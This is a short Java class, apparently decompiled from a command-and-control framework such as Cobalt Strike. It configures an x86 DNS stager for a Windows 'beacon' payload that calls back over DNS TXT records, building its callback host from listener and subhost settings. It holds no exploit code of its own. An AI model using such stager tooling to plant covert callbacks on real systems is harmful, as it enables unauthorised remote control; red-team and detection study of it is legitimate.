package stagers;

import common.ScListener;

public class BeaconDNSStagerX86 extends GenericDNSStagerX86 {
   public BeaconDNSStagerX86(ScListener var1) {
      super(var1);
   }

   public String getDNSHost() {
      return this.getListener().getStagerHost();
   }

   public String payload() {
      return "windows/beacon_dns/reverse_dns_txt";
   }

   public String getHost() {
      return !"".equals(this.getConfig().getDNSSubhost()) ? this.getConfig().getDNSSubhost() + this.getDNSHost() : super.getHost();
   }
}
